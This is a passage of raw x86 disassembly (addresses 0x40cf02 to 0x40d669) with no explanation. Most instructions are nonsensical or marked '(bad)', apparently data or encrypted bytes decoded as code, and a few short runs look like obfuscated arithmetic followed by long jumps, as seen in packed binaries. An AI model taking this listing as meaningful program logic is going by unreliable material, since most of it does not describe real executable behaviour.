  40cf02:	jb     0x40ce9c
  40cf04:	nop
  40cf05:	fisubr DWORD PTR [edx-0x253a5690]
  40cf0b:	jno    0x40cf43
  40cf0d:	inc    esp
  40cf0e:	jl     0x40cebb
  40cf10:	neg    BYTE PTR [esi]
  40cf12:	jne    0x40cef2
  40cf14:	push   es
  40cf15:	retf   
  40cf16:	push   ds
  40cf17:	and    al,0xe6
  40cf19:	jne    0x40cf29
  40cf1b:	shl    WORD PTR [esi-0x35ea2805],1
  40cf22:	push   ss
  40cf23:	push   edx
  40cf24:	push   esi
  40cf25:	enter  0x8456,0xb0
  40cf29:	pop    esp
  40cf2a:	inc    eax
  40cf2b:	scas   eax,DWORD PTR es:[edi]
  40cf2c:	in     al,dx
  40cf2d:	inc    edi
  40cf2e:	sbb    ecx,ebp
  40cf30:	dec    ebp
  40cf31:	and    bh,BYTE PTR [esi]
  40cf33:	sbb    eax,0xc5d4a100
  40cf38:	pop    esp
  40cf39:	lds    esp,FWORD PTR [eax+0x52853b27]
  40cf3f:	dec    edi
  40cf40:	push   ds
  40cf41:	idiv   DWORD PTR [ebx+0x5f]
  40cf44:	push   esp
  40cf45:	jno    0x40cf4d
  40cf47:	push   esi
  40cf48:	mov    esp,DWORD PTR [edx+0x6f]
  40cf4b:	add    DWORD PTR [edi],esi
  40cf4d:	xor    al,0x93
  40cf4f:	xor    cl,BYTE PTR [eax+0x32679621]
  40cf55:	out    0xe4,al
  40cf57:	push   es
  40cf58:	fwait
  40cf59:	retf   
  40cf5a:	loop   0x40cf4f
  40cf5c:	jmp    0x4913:0xabc8fed5
  40cf63:	xchg   edi,eax
  40cf64:	add    eax,0xbc636083
  40cf69:	jb     0x40cfa0
  40cf6b:	sub    DWORD PTR [ecx-0x1b],0x5388cc82
  40cf72:	add    dh,ch
  40cf74:	ins    BYTE PTR es:[edi],dx
  40cf75:	jae    0x40cfba
  40cf77:	mov    al,ds:0xd3714d92
  40cf7c:	adc    al,0xe3
  40cf7e:	bound  edx,QWORD PTR [ecx]
  40cf80:	test   DWORD PTR [ebx+0x7d391519],esp
  40cf86:	outs   dx,BYTE PTR ds:[esi]
  40cf87:	xchg   edx,eax
  40cf88:	test   al,0xab
  40cf8a:	fcom   QWORD PTR [ebx+0x58]
  40cf8d:	mov    ecx,0x9bf0e65f
  40cf92:	pop    ecx
  40cf93:	adc    eax,0xecf147c3
  40cf98:	ja     0x40cfd5
  40cf9a:	(bad)  
  40cf9b:	mov    al,ds:0x4a7fde06
  40cfa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cfa1:	stc    
  40cfa2:	in     al,dx
  40cfa3:	arpl   bp,bp
  40cfa5:	loopne 0x40cfc2
  40cfa7:	add    DWORD PTR [edx+0x5a],esp
  40cfaa:	jle    0x40cfc2
  40cfac:	xchg   edx,edx
  40cfae:	icebp  
  40cfaf:	inc    esi
  40cfb0:	rol    BYTE PTR [esi],0x89
  40cfb3:	ins    BYTE PTR es:[edi],dx
  40cfb4:	lea    edx,[edx+0x79]
  40cfb7:	aad    0xf0
  40cfb9:	and    ah,cl
  40cfbb:	sub    dl,BYTE PTR [eax+0x58]
  40cfbe:	adc    BYTE PTR [ebx-0x39d3f5db],ch
  40cfc4:	cdq    
  40cfc5:	es dec edi
  40cfc7:	js     0x40cfe1
  40cfc9:	aam    0x96
  40cfcb:	or     ch,ch
  40cfcd:	scas   eax,DWORD PTR es:[edi]
  40cfce:	aaa    
  40cfcf:	hlt    
  40cfd0:	jbe    0x40cf8e
  40cfd2:	loope  0x40cfb1
  40cfd4:	sbb    eax,0x289a4be2
  40cfd9:	xchg   esp,eax
  40cfda:	jmp    0xf449:0xf4aa9906
  40cfe1:	add    al,0x5b
  40cfe3:	sahf   
  40cfe4:	(bad)  
  40cfe5:	pop    eax
  40cfe6:	ins    BYTE PTR es:[edi],dx
  40cfe7:	cmp    dl,BYTE PTR [edx+edx*8]
  40cfea:	ss mov esi,gs
  40cfed:	mov    edi,0x3575eb0f
  40cff2:	jno    0x40d052
  40cff4:	sub    ebp,ecx
  40cff6:	cmp    dl,BYTE PTR [edx]
  40cff8:	fs adc ah,0xd2
  40cffc:	inc    ecx
  40cffd:	div    BYTE PTR [esi+0x33e0b80a]
  40d003:	add    BYTE PTR ds:0xf0b59ebc,ch
  40d009:	retf   
  40d00a:	out    dx,eax
  40d00b:	inc    ebp
  40d00c:	xchg   ebp,eax
  40d00d:	repnz inc BYTE PTR [esi]
  40d010:	jmp    0x23f8f5ed
  40d015:	jg     0x40cffa
  40d017:	retf   0xd60
  40d01a:	push   ss
  40d01b:	push   ecx
  40d01c:	sti    
  40d01d:	stc    
  40d01e:	dec    ebx
  40d01f:	add    ecx,DWORD PTR [esp+eiz*2+0x2d]
  40d023:	fisub  WORD PTR [edi+0x39]
  40d026:	jmp    0xaf0a66fc
  40d02b:	sub    al,0xd3
  40d02d:	in     al,dx
  40d02e:	push   ss
  40d02f:	mov    bh,0xb6
  40d031:	cs aaa 
  40d033:	or     DWORD PTR [ecx],ecx
  40d035:	fild   WORD PTR ds:0x704d5303
  40d03b:	cwde   
  40d03c:	mov    ecx,0x4a66b25c
  40d041:	out    0xde,al
  40d043:	(bad)  
  40d044:	pop    ds
  40d045:	arpl   WORD PTR [edi-0x5294aefe],dx
  40d04b:	adc    ebp,DWORD PTR [ecx+0x6a66a82b]
  40d051:	or     ecx,DWORD PTR [edi]
  40d053:	addr16 xchg eax,eax
  40d056:	iret   
  40d057:	inc    esi
  40d058:	sbb    eax,0x38853288
  40d05d:	push   es
  40d05e:	jbe    0x40d02c
  40d060:	inc    edi
  40d061:	(bad)  
  40d063:	mov    bl,BYTE PTR [ebx-0x6]
  40d066:	ja     0x40d03e
  40d068:	pop    ds
  40d069:	xchg   esi,eax
  40d06a:	xor    dl,BYTE PTR [ecx+ecx*2+0x52]
  40d06e:	xor    al,0x20
  40d070:	outs   dx,BYTE PTR ds:[esi]
  40d071:	add    DWORD PTR [esp+edx*4-0x4fee42d7],0xa6d0ee39
  40d07c:	cmp    edx,ecx
  40d07e:	fs js  0x40d052
  40d081:	aaa    
  40d082:	xor    al,0xf5
  40d084:	mov    ss,WORD PTR [eax]
  40d086:	mov    eax,ds:0x871e5a1d
  40d08b:	(bad)  
  40d08c:	jns    0x40d070
  40d08e:	cli    
  40d08f:	lods   al,BYTE PTR ds:[esi]
  40d090:	mov    esp,0xa567ac9f
  40d095:	addr16 addr16 push ebx
  40d098:	test   BYTE PTR gs:[ebx],dh
  40d09b:	call   0xa9970a8
  40d0a0:	fnstenv [eax]
  40d0a2:	mov    dh,0xb4
  40d0a4:	add    ebx,DWORD PTR [eax+0x4e01f589]
  40d0aa:	push   ds
  40d0ab:	out    0x38,al
  40d0ad:	adc    DWORD PTR [ebp+ecx*4-0x1b37152],ebp
  40d0b4:	xlat   BYTE PTR ds:[ebx]
  40d0b5:	xchg   edx,eax
  40d0b6:	pop    edi
  40d0b7:	int3   
  40d0b8:	or     DWORD PTR [edx-0x45],edi
  40d0bb:	icebp  
  40d0bc:	dec    esi
  40d0bd:	aas    
  40d0be:	mov    ebx,0x7d21b969
  40d0c3:	jbe    0x40c12f
  40d0c9:	mov    edx,DWORD PTR [ebp-0xc]
  40d0cc:	mov    edi,DWORD PTR [ebp-0x24]
  40d0cf:	xor    edx,eax
  40d0d1:	add    edx,ecx
  40d0d3:	imul   edx,edi
  40d0d6:	mov    edi,DWORD PTR [ebp-0x18]
  40d0d9:	xor    edi,eax
  40d0db:	add    edx,edi
  40d0dd:	jmp    0x40d49b
  40d0e2:	xor    ah,BYTE PTR [edi+ecx*8]
  40d0e5:	out    0xcd,al
  40d0e7:	icebp  
  40d0e8:	xor    esp,esi
  40d0ea:	cmp    al,0x59
  40d0ec:	lods   al,BYTE PTR ds:[esi]
  40d0ed:	les    eax,FWORD PTR [ebp+0x2b]
  40d0f0:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d0f2:	stos   BYTE PTR es:[edi],al
  40d0f3:	popf   
  40d0f4:	jo     0x40d166
  40d0f6:	lahf   
  40d0f7:	jge    0x40d169
  40d0f9:	jo     0x40d16b
  40d0fb:	add    BYTE PTR [ecx],al
  40d0fd:	sub    dl,ah
  40d0ff:	mov    ebx,0xbe4a5c5f
  40d104:	shl    BYTE PTR [esi+0x48950a9a],0xce
  40d10b:	jo     0x40d16f
  40d10d:	aaa    
  40d10e:	mov    cl,bh
  40d110:	clc    
  40d111:	push   ecx
  40d112:	jne    0x40d11e
  40d114:	out    dx,eax
  40d115:	jmp    0x7c69e2a4
  40d11a:	stc    
  40d11b:	xchg   ebp,eax
  40d11c:	in     eax,0x9f
  40d11e:	fld    TBYTE PTR [ecx+0x6f276823]
  40d124:	pop    esp
  40d125:	nop
  40d126:	ja     0x40d13b
  40d128:	enter  0x8406,0x23
  40d12c:	inc    ebp
  40d12d:	jo     0x40d15a
  40d12f:	cdq    
  40d130:	adc    BYTE PTR [ecx-0x7b94d8ef],dh
  40d136:	jecxz  0x40d0d3
  40d138:	(bad)  
  40d139:	fstp   QWORD PTR [eax-0x60fed5f]
  40d13f:	xchg   esi,eax
  40d140:	sub    esp,DWORD PTR [ebp+ebx*2-0x6aca95d8]
  40d147:	add    ch,0x68
  40d14a:	mov    al,ds:0xdb259012
  40d14f:	scas   eax,DWORD PTR es:[edi]
  40d150:	and    eax,0x1a44977
  40d155:	sar    BYTE PTR [edi+0xe970c92],0xff
  40d15c:	jae    0x40d1be
  40d15e:	dec    esi
  40d15f:	int3   
  40d160:	pop    eax
  40d161:	sar    DWORD PTR [esi+0x38ad8856],0xf2
  40d168:	push   ebx
  40d169:	outs   dx,BYTE PTR ds:[esi]
  40d16a:	pop    ebp
  40d16b:	sub    edi,DWORD PTR [esi]
  40d16d:	add    DWORD PTR [ebp+edx*1+0x11dd863],ebp
  40d174:	and    al,0x64
  40d176:	inc    ebx
  40d177:	push   ebp
  40d178:	(bad)  
  40d179:	mov    ch,cl
  40d17b:	lds    ebx,FWORD PTR [ebx]
  40d17d:	test   BYTE PTR ds:0xcc0216c8,bh
  40d183:	xchg   ebx,eax
  40d184:	mov    edi,0x9d08c756
  40d189:	ret    0x79ff
  40d18c:	push   esp
  40d18d:	inc    edi
  40d18e:	and    al,0x20
  40d190:	inc    eax
  40d191:	dec    eax
  40d192:	add    eax,0xbf51d453
  40d197:	sbb    al,0x79
  40d199:	sahf   
  40d19a:	dec    esp
  40d19b:	mov    esp,0xe0d6efa9
  40d1a0:	sbb    ebp,DWORD PTR [ecx+0x5]
  40d1a3:	das    
  40d1a4:	jp     0x40d1a0
  40d1a6:	(bad)  
  40d1a7:	hlt    
  40d1a8:	or     DWORD PTR [esi],ecx
  40d1aa:	mov    ch,0x5
  40d1ac:	sub    ecx,0xcb162e6d
  40d1b2:	inc    esi
  40d1b3:	sub    ecx,DWORD PTR [edx]
  40d1b5:	push   ebx
  40d1b6:	add    ch,BYTE PTR [edi]
  40d1b8:	test   ah,dh
  40d1ba:	dec    ebx
  40d1bb:	sar    esp,cl
  40d1bd:	sub    cl,BYTE PTR [edi-0x6f]
  40d1c0:	or     al,0x4d
  40d1c2:	dec    ebp
  40d1c3:	fcomp  QWORD PTR [edx]
  40d1c5:	daa    
  40d1c6:	xor    al,0xe0
  40d1c8:	xlat   BYTE PTR ds:[ebx]
  40d1c9:	sub    BYTE PTR [ecx+0x1da8e96c],bh
  40d1cf:	sti    
  40d1d0:	xor    al,bh
  40d1d2:	loop   0x40d15f
  40d1d4:	test   eax,0xe03adac
  40d1d9:	inc    esi
  40d1da:	mov    edx,0x4c6fda19
  40d1df:	mov    edx,0x56d48207
  40d1e4:	jo     0x40d223
  40d1e6:	ss jl  0x40d219
  40d1e9:	jmp    0xa0877479
  40d1ee:	jg     0x40d205
  40d1f0:	mov    dh,0xbe
  40d1f2:	jmp    0x40d1d0
  40d1f4:	sti    
  40d1f5:	out    0xb3,al
  40d1f7:	(bad)  
  40d1f8:	es pop ds
  40d1fa:	xor    esi,esp
  40d1fc:	xchg   edi,eax
  40d1fd:	out    0x61,eax
  40d1ff:	xchg   esp,eax
  40d200:	ss sbb ebp,esi
  40d203:	cdq    
  40d204:	out    dx,eax
  40d205:	es sub ebx,ebp
  40d208:	ins    DWORD PTR es:[edi],dx
  40d209:	pusha  
  40d20a:	pop    ecx
  40d20b:	push   ebp
  40d20c:	adc    al,0x70
  40d20e:	or     BYTE PTR [eax-0x39ed1862],bl
  40d214:	add    cl,al
  40d216:	pop    edi
  40d217:	sub    bh,BYTE PTR [esi+0x4a2d7ffd]
  40d21d:	ins    BYTE PTR es:[edi],dx
  40d21e:	fimul  WORD PTR [edx-0x14]
  40d221:	mov    ds:0x9fd2fd5f,eax
  40d226:	repnz mov es,edx
  40d229:	xor    BYTE PTR [edi],ch
  40d22b:	in     al,dx
  40d22c:	dec    esi
  40d22d:	sahf   
  40d22e:	xchg   edi,eax
  40d22f:	stc    
  40d230:	jo     0x40d1f1
  40d232:	push   0x2e34e003
  40d237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d238:	mov    eax,0x4acdca4c
  40d23d:	or     cl,dl
  40d23f:	pop    es
  40d240:	push   0x762f46ba
  40d245:	push   ss
  40d246:	outs   dx,BYTE PTR ds:[esi]
  40d247:	jl     0x40d2ab
  40d249:	(bad)  
  40d24a:	mov    WORD PTR [esi-0x4e7d8769],?
  40d250:	(bad)  
  40d251:	push   eax
  40d252:	inc    esi
  40d253:	ret    0x9c67
  40d256:	not    DWORD PTR [edi-0x41]
  40d259:	scas   eax,DWORD PTR es:[edi]
  40d25a:	fwait
  40d25b:	std    
  40d25c:	mov    ds:0x8afb2ab6,al
  40d261:	inc    eax
  40d262:	jnp    0x40d241
  40d264:	mov    ecx,0x248db3c4
  40d269:	jb     0x40d23d
  40d26b:	inc    ecx
  40d26c:	jge    0x40d230
  40d26e:	sub    BYTE PTR [ecx],al
  40d270:	repz push ebp
  40d272:	call   0x1344:0xf6437bbf
  40d279:	adc    bh,BYTE PTR [ebp-0x42]
  40d27c:	leave  
  40d27d:	jmp    0x40d2d5
  40d27f:	cmp    BYTE PTR [ecx-0x6b],ah
  40d282:	jge    0x40d303
  40d284:	pop    esp
  40d285:	push   edi
  40d286:	mov    edx,0x2dcb865f
  40d28b:	ret    0x8063
  40d28e:	xchg   ebx,esp
  40d290:	fdiv   QWORD PTR [ecx+0x559c2072]
  40d296:	scas   eax,DWORD PTR es:[edi]
  40d297:	loope  0x40d2b3
  40d299:	cli    
  40d29a:	in     al,dx
  40d29b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d29c:	push   esp
  40d29d:	fwait
  40d29e:	xor    BYTE PTR [ecx+0x19a5ea37],cl
  40d2a4:	pop    ecx
  40d2a5:	lock adc al,0xf4
  40d2a8:	(bad)  
  40d2a9:	(bad)  
  40d2aa:	(bad)  
  40d2ab:	dec    eax
  40d2ac:	inc    eax
  40d2ad:	jbe    0x40d24f
  40d2af:	clc    
  40d2b0:	ins    BYTE PTR es:[edi],dx
  40d2b1:	jl     0x40d2b3
  40d2b3:	imul   edx,DWORD PTR [ebp+0x34],0xffffffa2
  40d2b7:	call   ebp
  40d2b9:	inc    ecx
  40d2ba:	jg     0x40d2a8
  40d2bc:	inc    edx
  40d2bd:	xchg   ebp,eax
  40d2be:	push   edx
  40d2bf:	aas    
  40d2c0:	jae    0x40d25d
  40d2c2:	leave  
  40d2c3:	mov    ah,BYTE PTR [edx]
  40d2c5:	fistp  DWORD PTR [edi]
  40d2c7:	mov    dl,0x5
  40d2c9:	ja     0x40d2a4
  40d2cb:	retf   
  40d2cc:	das    
  40d2cd:	pop    ebx
  40d2ce:	adc    DWORD PTR [ebx],edi
  40d2d0:	xor    bl,dh
  40d2d2:	(bad)  
  40d2d3:	icebp  
  40d2d4:	mov    bh,0x5a
  40d2d6:	mov    bh,0xce
  40d2d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2d9:	jnp    0x40d2e0
  40d2db:	loopne 0x40d33a
  40d2dd:	add    al,0x4d
  40d2df:	loop   0x40d343
  40d2e1:	mov    esp,0xf9974772
  40d2e6:	sub    al,BYTE PTR fs:[ecx-0x5e779bad]
  40d2ed:	sub    cl,al
  40d2ef:	imul   eax,DWORD PTR [edi-0x17],0xffffff9c
  40d2f3:	lea    esp,[eax+0x957eea4]
  40d2f9:	pop    esp
  40d2fa:	into   
  40d2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2fc:	push   ebp
  40d2fd:	fidiv  DWORD PTR [bx+di]
  40d300:	jb     0x40d2db
  40d302:	hlt    
  40d303:	sub    DWORD PTR [esp+edi*4],ecx
  40d306:	cwde   
  40d307:	or     al,0x39
  40d309:	mov    BYTE PTR ss:[ecx-0x76b0e342],dl
  40d310:	pop    ecx
  40d311:	xor    BYTE PTR [eax-0x29b81da9],al
  40d317:	inc    esp
  40d318:	or     al,BYTE PTR [edx+esi*2+0x7f]
  40d31c:	or     al,0xee
  40d31e:	test   BYTE PTR [esp+ecx*8-0x24e2a590],bh
  40d325:	(bad)  
  40d326:	jge    0x40d364
  40d328:	(bad)  
  40d329:	stc    
  40d32a:	fstp   QWORD PTR [ebp-0x79]
  40d32d:	jl     0x40d2b1
  40d32f:	ret    
  40d330:	in     eax,0x9d
  40d332:	cmp    DWORD PTR [esi-0x18],esi
  40d335:	cmp    BYTE PTR [ebx+0x3b87464b],bh
  40d33b:	sub    BYTE PTR [ebx-0x65931a51],al
  40d341:	out    dx,eax
  40d342:	sub    ebx,DWORD PTR [esi+0x4]
  40d345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d346:	cmp    ecx,esp
  40d348:	xlat   BYTE PTR ds:[ebx]
  40d349:	aam    0x3f
  40d34b:	pushf  
  40d34c:	adc    BYTE PTR [esi-0x4bf73f3],dl
  40d352:	pusha  
  40d353:	mov    esi,0xfb710771
  40d358:	out    0xa,al
  40d35a:	xor    BYTE PTR [edi+0x13],bh
  40d35d:	in     al,0x16
  40d35f:	cwde   
  40d360:	xchg   edi,eax
  40d361:	inc    ebp
  40d362:	pop    esp
  40d363:	sbb    edi,DWORD PTR [eax-0x50]
  40d366:	sbb    al,0x47
  40d368:	into   
  40d369:	loope  0x40d34b
  40d36b:	mov    ds:0x5b6e8916,eax
  40d370:	xor    eax,0x54fa3026
  40d375:	add    cl,bl
  40d377:	mov    al,es:0x297e371a
  40d37d:	not    BYTE PTR [ebx-0x39872090]
  40d383:	jle    0x40d379
  40d385:	or     eax,0x52e3d281
  40d38a:	or     BYTE PTR [eax+eax*4-0x4a],dh
  40d38e:	xchg   ebx,eax
  40d38f:	je     0x40d3d0
  40d391:	mov    ah,0x41
  40d393:	gs jb  0x40d327
  40d396:	xchg   esi,eax
  40d397:	data16 ficom DWORD PTR [esi+0x53]
  40d39b:	xchg   esi,eax
  40d39c:	test   eax,0x1cd1413c
  40d3a1:	mov    ecx,0xba08f870
  40d3a6:	stos   DWORD PTR es:[edi],eax
  40d3a7:	imul   ebx,DWORD PTR [esi-0x10],0xf74b5887
  40d3ae:	or     BYTE PTR [esi+0x195e2eb8],0xd5
  40d3b5:	sbb    ebp,DWORD PTR es:[ebx]
  40d3b8:	sbb    al,0xce
  40d3ba:	xor    eax,0x6b6a7b12
  40d3bf:	jae    0x40d38a
  40d3c1:	ret    0x9349
  40d3c4:	push   ebp
  40d3c5:	sub    bl,BYTE PTR [ebp+0x74]
  40d3c8:	mov    cl,0xc
  40d3ca:	aam    0x85
  40d3cc:	jp     0x40d39c
  40d3ce:	xchg   edx,eax
  40d3cf:	js     0x40d3f4
  40d3d1:	fisttp WORD PTR [eax+0x49]
  40d3d4:	clc    
  40d3d5:	dec    esp
  40d3d6:	dec    ebp
  40d3d7:	mov    ?,WORD PTR [edx+0x3f]
  40d3da:	adc    al,0xb8
  40d3dc:	call   0x337f0df0
  40d3e1:	imul   eax,DWORD PTR [edx],0xffffff87
  40d3e4:	adc    BYTE PTR [ecx],bh
  40d3e6:	adc    bl,BYTE PTR [ebp+ebx*8+0x5a]
  40d3ea:	(bad)  
  40d3ec:	jnp    0x40d44d
  40d3ee:	lock sbb BYTE PTR [ecx+0x11d678be],cl
  40d3f5:	add    eax,0x61bf4cd0
  40d3fa:	aam    0x16
  40d3fc:	in     al,dx
  40d3fd:	jne    0x40d420
  40d3ff:	mov    bh,0x7d
  40d401:	scas   eax,DWORD PTR es:[edi]
  40d402:	jmp    0x40d396
  40d404:	pop    ecx
  40d405:	mov    edx,0xe8a5dab3
  40d40a:	(bad)  
  40d40b:	pop    edi
  40d40c:	mov    bl,0xb2
  40d40e:	sbb    ebp,DWORD PTR [ebp+0x9]
  40d411:	cli    
  40d412:	ja     0x40d3f2
  40d414:	leave  
  40d415:	xor    bl,bh
  40d417:	outs   dx,BYTE PTR ds:[esi]
  40d418:	shl    DWORD PTR [ebx+edi*8],0x67
  40d41c:	(bad)  
  40d41d:	xor    edx,0x15
  40d420:	cli    
  40d421:	(bad)  
  40d422:	scas   eax,DWORD PTR es:[edi]
  40d423:	ss sub ebx,ecx
  40d426:	sub    eax,0x580e3de5
  40d42b:	pusha  
  40d42c:	(bad)  
  40d42d:	(bad)  
  40d42e:	cmp    cl,BYTE PTR [esi+0x30577a71]
  40d434:	ins    BYTE PTR es:[edi],dx
  40d435:	mov    dl,0x58
  40d437:	xor    ch,BYTE PTR [edx+0x4c]
  40d43a:	sub    bh,cl
  40d43c:	pop    eax
  40d43d:	enter  0x504b,0xfb
  40d441:	or     DWORD PTR [ebp+0x61263843],ebx
  40d447:	retf   0x2f8e
  40d44a:	retf   0xf778
  40d44d:	or     ecx,DWORD PTR [ecx+0x5f914627]
  40d453:	xchg   ebx,eax
  40d454:	push   edi
  40d455:	lock push ebx
  40d457:	adc    ecx,DWORD PTR [edi-0x5a2823aa]
  40d45d:	sbb    eax,0xb00b6278
  40d462:	sub    ecx,DWORD PTR [edx]
  40d464:	fnstsw WORD PTR [esi-0x69]
  40d467:	jns    0x40d445
  40d469:	in     eax,0x28
  40d46b:	test   BYTE PTR [ecx],0x76
  40d46e:	mov    esi,esp
  40d470:	and    BYTE PTR [edx+0x20c6eb4f],dl
  40d476:	jnp    0x40d4b0
  40d478:	xchg   edx,eax
  40d479:	mov    eax,0x5bdd683a
  40d47e:	stc    
  40d47f:	mov    eax,0x22efe79a
  40d484:	pop    esi
  40d485:	std    
  40d486:	pop    esp
  40d487:	mov    dl,0x33
  40d489:	pop    ebx
  40d48a:	repz in eax,dx
  40d48c:	fst    st(3)
  40d48e:	cdq    
  40d48f:	or     al,0xb5
  40d491:	stos   DWORD PTR es:[edi],eax
  40d492:	push   esp
  40d493:	sub    DWORD PTR [edx],edx
  40d495:	xchg   esp,eax
  40d496:	push   esp
  40d497:	mov    edi,0x8b87ea4d
  40d49c:	jge    0x40d496
  40d49e:	lea    edx,[edx+edi*1+0x32729c]
  40d4a5:	mov    DWORD PTR [ebp-0x8],edx
  40d4a8:	mov    edx,DWORD PTR [ebp-0x20]
  40d4ab:	xor    edx,eax
  40d4ad:	mov    edi,0xffcd8d64
  40d4b2:	sub    edi,edx
  40d4b4:	jmp    0x40d872
  40d4b9:	out    dx,al
  40d4ba:	inc    ebx
  40d4bb:	push   0x4e
  40d4bd:	jno    0x40d534
  40d4bf:	jmp    0xbed3:0xb81a1d63
  40d4c6:	mov    ds:0x99c90f05,eax
  40d4cb:	jo     0x40d53d
  40d4cd:	lahf   
  40d4ce:	jge    0x40d540
  40d4d0:	jo     0x40d547
  40d4d2:	mov    ds:0x23f04729,eax
  40d4d7:	fstp   DWORD PTR [eax]
  40d4d9:	jp     0x40d47d
  40d4db:	jne    0x40d53b
  40d4dd:	mov    ds:0x894df696,eax
  40d4e2:	and    DWORD PTR [edi+0x47963183],0x38
  40d4e9:	add    eax,0x2d1fcd9a
  40d4ee:	sti    
  40d4ef:	icebp  
  40d4f0:	cld    
  40d4f1:	imul   ecx,DWORD PTR [edx],0xffffffe4
  40d4f4:	xchg   esp,eax
  40d4f5:	pop    edx
  40d4f6:	sub    dh,BYTE PTR [esi-0x56]
  40d4f9:	daa    
  40d4fa:	mov    BYTE PTR [ebx+0x5b01b345],cl
  40d500:	push   0x2bda44ab
  40d505:	xchg   DWORD PTR [edi+eax*2],esp
  40d508:	jmp    0x88db694d
  40d50d:	mov    ebp,0xe8da5902
  40d512:	jmp    0x40d514
  40d514:	or     eax,0x616e1cfc
  40d519:	xchg   BYTE PTR [edx+0x25185a4c],cl
  40d51f:	out    dx,al
  40d520:	jnp    0x40d500
  40d522:	xchg   edi,eax
  40d523:	test   eax,0xcd0880cc
  40d528:	add    edi,DWORD PTR [esi]
  40d52a:	les    esi,FWORD PTR [edi+0x39]
  40d52d:	jne    0x40d587
  40d52f:	jno    0x40d590
  40d531:	imul   ecx,DWORD PTR [esi-0x6],0x8ba5dc3f
  40d538:	push   ebx
  40d539:	repz or edi,DWORD PTR [esi]
  40d53c:	imul   ecx,DWORD PTR [eax],0x17
  40d53f:	jne    0x40d50b
  40d541:	sahf   
  40d542:	test   eax,0x11f5ba8f
  40d547:	jle    0x40d548
  40d549:	pop    edx
  40d54a:	enter  0xa2bc,0xd3
  40d54e:	dec    ecx
  40d54f:	mov    BYTE PTR [edi-0x4332c591],dh
  40d555:	mov    ebx,0x768e7c46
  40d55a:	popf   
  40d55b:	mov    dh,0x8b
  40d55d:	add    BYTE PTR [esi],dh
  40d55f:	jp     0x40d54a
  40d561:	loope  0x40d54c
  40d563:	cwde   
  40d564:	leave  
  40d565:	sar    BYTE PTR [edx+0x2d],0x28
  40d569:	pop    esp
  40d56a:	mov    ebx,0x2899e1ed
  40d56f:	out    dx,eax
  40d570:	push   ecx
  40d571:	inc    edi
  40d572:	xchg   ebx,eax
  40d573:	inc    edx
  40d574:	out    dx,eax
  40d575:	lock test eax,0x30f50718
  40d57b:	adc    al,0x47
  40d57d:	mov    esp,0x9a84ce45
  40d582:	je     0x40d536
  40d584:	xor    al,0xff
  40d586:	sub    BYTE PTR [ebx+0x60],dh
  40d589:	xchg   edx,eax
  40d58a:	and    al,0xc9
  40d58c:	shl    BYTE PTR [esi+edi*4-0x43],0x12
  40d591:	mov    dl,0x8f
  40d593:	cli    
  40d594:	cmp    BYTE PTR [edx],bh
  40d596:	push   edi
  40d597:	jne    0x40d5c6
  40d599:	lods   eax,DWORD PTR ds:[esi]
  40d59a:	clc    
  40d59b:	mov    al,ds:0xd4c67221
  40d5a0:	addr16 retf 0xa63d
  40d5a4:	shl    DWORD PTR ds:0x797bf2e3,0xca
  40d5ab:	mov    cl,0xcd
  40d5ad:	sar    BYTE PTR [edx],cl
  40d5af:	cmp    BYTE PTR [ecx+0x2c6dbe62],bl
  40d5b5:	jle    0x40d548
  40d5b7:	test   BYTE PTR [ebx],ah
  40d5b9:	cmp    eax,0xf1dce465
  40d5be:	jl     0x40d59f
  40d5c0:	sar    esi,0xb5
  40d5c3:	popf   
  40d5c4:	into   
  40d5c5:	mov    ah,0x8e
  40d5c7:	mov    ds:0x403a1fa1,eax
  40d5cc:	std    
  40d5cd:	jg     0x40d5e5
  40d5cf:	(bad)  [eax]
  40d5d1:	sub    eax,0x7d500a88
  40d5d6:	mov    ecx,0x5b8f3ac2
  40d5db:	lods   eax,DWORD PTR ds:[esi]
  40d5dc:	push   0xff3e4dcb
  40d5e1:	xchg   DWORD PTR [ebp+0x1],edi
  40d5e4:	mov    ebp,DWORD PTR [ebx]
  40d5e6:	icebp  
  40d5e7:	lahf   
  40d5e8:	adc    BYTE PTR [ebx],al
  40d5ea:	into   
  40d5eb:	inc    ebp
  40d5ec:	sbb    al,0x6d
  40d5ee:	aaa    
  40d5ef:	mov    ds:0x4caae257,eax
  40d5f4:	aad    0xb0
  40d5f6:	push   ebx
  40d5f7:	mov    ebp,DWORD PTR [edx+0x45]
  40d5fa:	push   ecx
  40d5fb:	jnp    0x40d5a7
  40d5fd:	dec    edi
  40d5fe:	sub    esp,DWORD PTR [ebx+0x3e04a623]
  40d604:	pop    eax
  40d605:	enter  0xe5e5,0x2
  40d609:	and    BYTE PTR [edx],dl
  40d60b:	jl     0x40d61d
  40d60d:	and    cl,BYTE PTR [ebx]
  40d60f:	adc    edi,edi
  40d611:	sub    dh,BYTE PTR [ecx+0x45aa6a29]
  40d617:	pushf  
  40d618:	int    0x7e
  40d61a:	out    dx,al
  40d61b:	xchg   ebx,eax
  40d61c:	pop    eax
  40d61d:	xchg   BYTE PTR [ebx+0x561b8a37],ch
  40d623:	xchg   BYTE PTR [ecx+0x4a],bh
  40d626:	push   esi
  40d627:	adc    ah,BYTE PTR [eax+0x23ad8734]
  40d62d:	test   al,0xb7
  40d62f:	jecxz  0x40d5ed
  40d631:	stos   DWORD PTR es:[edi],eax
  40d632:	sbb    al,0xd6
  40d634:	mov    ds:0xa39843b9,al
  40d639:	sahf   
  40d63a:	inc    edi
  40d63b:	(bad)  
  40d63c:	lahf   
  40d63d:	sahf   
  40d63e:	fist   WORD PTR [ebx-0xb]
  40d641:	mov    eax,0x252013d8
  40d646:	ss scas al,BYTE PTR es:[edi]
  40d648:	je     0x40d61a
  40d64a:	mov    cl,0x94
  40d64c:	mov    esi,0xeada9efd
  40d651:	dec    ebp
  40d652:	(bad)  
  40d653:	std    
  40d654:	add    esi,edi
  40d656:	mov    ds:0x6cc6a930,al
  40d65b:	sub    al,0x28
  40d65d:	add    al,0xde
  40d65f:	adc    BYTE PTR ds:[esi+0x57],dh
  40d663:	out    dx,eax
  40d664:	and    DWORD PTR [ebx-0x75],ecx
  40d667:	sbb    BYTE PTR [edi],bh
  40d669:	dec    ebx
